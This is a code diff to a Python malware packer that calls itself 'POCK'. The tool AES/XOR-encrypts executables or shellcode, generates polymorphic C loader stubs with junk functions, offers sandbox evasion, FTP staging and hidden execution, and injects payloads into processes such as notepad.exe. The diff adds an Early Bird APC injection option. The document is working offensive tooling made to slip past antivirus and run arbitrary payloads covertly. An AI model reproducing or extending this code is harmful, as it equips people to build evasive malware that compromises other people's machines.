@@ -36,7 +36,7 @@ def aes_encrypt(data, key):
 def random_identifier(length=8):
     return ''.join(random.choice(string.ascii_letters) for _ in range(length))
 
-def generate_stub(payload_bytes, key, enc_algo, payload_type, url=None, embed_payload=True, ftp_user="anonymous", ftp_pass="", inject_method="apc", target_process=None):
+def generate_stub(payload_bytes, key, enc_algo, payload_type, url=None, embed_payload=True, ftp_user="anonymous", ftp_pass="", inject_method="apc", target_process=None, early_bird=False):
     if embed_payload:
         payload_array = ','.join(f'0x{b:02x}' for b in payload_bytes)
         payload_len = len(payload_bytes)
@@ -75,6 +75,13 @@ int {junk_func}() {{
     stub_code = stub_code.replace("{{PAYLOAD_TYPE}}", f'"{payload_type}"')
     stub_code = stub_code.replace("{{FTP_USER}}", ftp_user)
     stub_code = stub_code.replace("{{FTP_PASS}}", ftp_pass)
+
+    if inject_method == "apc":
+        stub_code = stub_code.replace("{{INJECT_METHOD_CALL}}", "inject_APC(buf, len);")
+    if early_bird:
+        stub_code = "#define EARLY_BIRD_MODE 1\n" + stub_code
+    else:
+        stub_code = "#define EARLY_BIRD_MODE 0\n" + stub_code
 
     if url:
         parsed_url = urlparse(url)
@@ -136,7 +143,7 @@ def compile_stub(output_name, hide=False, inject_method=None, payload_type=None)
     subprocess.run(cmd, check=True)
 
 def main():
-    parser = argparse.ArgumentParser(description="Polymorphic hardened AES/XOR packer with sandbox evasion and FTP staging + auth")
+    parser = argparse.ArgumentParser(description="POCK: A Polymorphic hardened AES/XOR packer")
     parser.add_argument("-i", "--input", required=True, help="Input file (exe or shellcode)")
     parser.add_argument("-o", "--output", required=True, help="Output packed executable")
     parser.add_argument("-t", "--type", required=True, choices=["shellcode", "exe", "dll"], help="Payload type")
@@ -149,6 +156,7 @@ def main():
     parser.add_argument("--hide", action="store_true", help="Compile stub with -mwindows for hidden execution")
     parser.add_argument("--inject", choices=["apc", "indirect"], default="apc", help="Injection method")
     parser.add_argument("--target-process", help="Target process name for indirect injection (e.g., notepad.exe)")
+    parser.add_argument("--early-bird", action="store_true", help="Enable Early Bird APC injection")
     args = parser.parse_args()
 
     print(f"[+] Loading input file: {args.input}")
@@ -184,7 +192,8 @@ def main():
             ftp_user=args.ftp_user, 
             ftp_pass=args.ftp_pass, 
             inject_method=args.inject, 
-            target_process=args.target_process
+            target_process=args.target_process,
+            early_bird=args.early_bird
         )
     else:
         print("[+] Embedding payload directly into stub")
